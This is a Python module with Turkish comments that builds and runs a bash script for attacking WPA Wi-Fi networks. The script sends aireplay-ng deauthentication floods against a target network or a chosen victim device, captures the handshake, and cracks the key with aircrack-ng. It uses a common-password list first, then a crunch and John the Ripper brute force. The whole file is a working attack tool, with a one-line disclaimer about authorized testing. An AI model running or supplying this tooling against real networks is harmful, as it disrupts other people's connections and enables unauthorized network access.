"""Saldiri akisi: handshake yakalama + WPA kirma.

Orijinal launch_attack_terminal mantigi KORUNUR; iki yapisal fark:
- aireplay-ng arayuzu artik parametre ({IFACE}); boylece wlan0 yerine calisma
  aninda tespit edilen monitor arayuzu (orn. wlan0mon) kullanilir,
- /tmp betik dosyasi + gnome-terminal yerine ayni terminalde `bash -c` ile calisir.

Deauth/handshake/kirma mantigi orijinalle aynidir (sadece arayuz dinamiklesti).
Yalnizca kendi aglarinda / yazili izinli testlerde kullanilmalidir.
"""

import subprocess
from pathlib import Path

DATA = Path(__file__).resolve().parent.parent / "data"


def run_attack(BSSID, CAPNAME, IFACE, cwd=None):
    """Saldiri betigini ayni terminalde interaktif calistirir.

    cwd verilirse tum ciktilar (.cap, custom_pass.txt, found_key.txt, .rec) o
    klasore yazilir (bkz. captures/).
    """
    custom_passwords = (DATA / "common_passwords.txt").read_text(encoding="utf-8").rstrip("\n")

    script_content = f"""#!/usr/bin/env bash
echo "Hedef BSSID: {BSSID}"

echo -e "\\n[?] SALDIRI TURU SECIN:"
echo "1) Tum agi kesme"
echo "2) Kurbani kes"
read -p "Secim (1/2): " CHOICE

TARGET_MAC=""
if [ "$CHOICE" == "2" ]; then
    echo "Kurbanin mac adresi:"
    read TARGET_MAC
fi

echo -e "\\n[*] Islemler basliyor..."

for i in {{1..3}}; do
    echo -e "\\n[*] Deneme $i/3: Deauth gonderiliyor..."
    
    if [ "$CHOICE" == "2" ] && [ ! -z "$TARGET_MAC" ]; then
        aireplay-ng --deauth 10 -D -a {BSSID} -c $TARGET_MAC {IFACE}
    else
        aireplay-ng --deauth 10 -D -a {BSSID} {IFACE}
    fi
    
    echo "[*] Paketler gonderildi. Kurbanin tekrar baglanmasi bekleniyor (10sn)..."
    sleep 10
    
    CAPFILE="{CAPNAME}-01.cap"
    if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
        echo -e "\\033[1;32m[+] HANDSHAKE YAKALANDI!\\033[0m"
        break
    else
        echo -e "\\033[1;33m[-] Handshake bos, tekrar deneniyor...\\033[0m"
    fi
done

if aircrack-ng "$CAPFILE" 2>&1 | grep -q "1 handshake"; then
    echo -e "\\n[?] Sifre Kirma baslasin mi (e/h)"
    read DO_CRACK
    
    if [ "$DO_CRACK" == "e" ]; then
        
        echo -e "\\n\\033[1;34m[*] Once yaygin ozel sifreler deneniyor...\\033[0m"
        
        echo "{custom_passwords}" > custom_pass.txt
        
        aircrack-ng -w custom_pass.txt -b {BSSID} "$CAPFILE" -l found_key.txt
        
        if [ -f "found_key.txt" ]; then
            echo -e "\\n\\033[1;32m[+] MUKEMMEL! Sifre ozel listede bulundu!\\033[0m"
            echo -e "\\033[1;32m[+] SIFRE: $(cat found_key.txt)\\033[0m"
            rm custom_pass.txt found_key.txt 2>/dev/null
            echo -e "\\n[*] Islem bitti. Cikmak icin ENTER."
            read
            exit 0
        else
            echo -e "\\033[1;31m[-] Ozel listede yok. Derin taramaya (Crunch) geciliyor...\\033[0m"
            rm custom_pass.txt 2>/dev/null
        fi

        SESSION_NAME="vessel_crack"
        
        print_resume_cmd() {{
            echo -e "\\n\\033[1;33m[!] Daha sonra devam etmek icin su satiri calistir:\\033[0m"
            echo -e "\\033[1;97mjohn --restore=$SESSION_NAME | aircrack-ng -w - -b {BSSID} \"$CAPFILE\"\\033[0m"
            echo -e "\\n"
        }}

        if [ -f "$SESSION_NAME.rec" ]; then
            echo -e "\\033[1;36m[!] Eski bir oturum bulundu! Kaldigi yerden devam edilsin mi? (e/h)\\033[0m"
            read RESUME
            if [ "$RESUME" == "e" ]; then
                echo "[*] Eski oturum yukleniyor..."
                print_resume_cmd
                john --restore=$SESSION_NAME | aircrack-ng -w - -b {BSSID} "$CAPFILE"
            else
                echo "[*] Eski oturum siliniyor, sifirdan baslaniyor..."
                rm "$SESSION_NAME.rec" 2>/dev/null
                print_resume_cmd
                crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | john --stdin --session=$SESSION_NAME --stdout | aircrack-ng -w - -b {BSSID} "$CAPFILE"
            fi
        else
            echo "[*] Yeni oturum baslatiliyor (Crunch + John + Aircrack)..."
            print_resume_cmd
            crunch 8 16 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | john --stdin --session=$SESSION_NAME --stdout | aircrack-ng -w - -b {BSSID} "$CAPFILE"
        fi
    fi
else
    echo -e "\\033[1;31m[!] Handshake yakalanamadi. PMF korumali olabilir.\\033[0m"
fi

echo -e "\\n[*] Islem bitti. Cikmak icin ENTER basin."
read
"""
    subprocess.run(["bash", "-c", script_content], cwd=cwd)
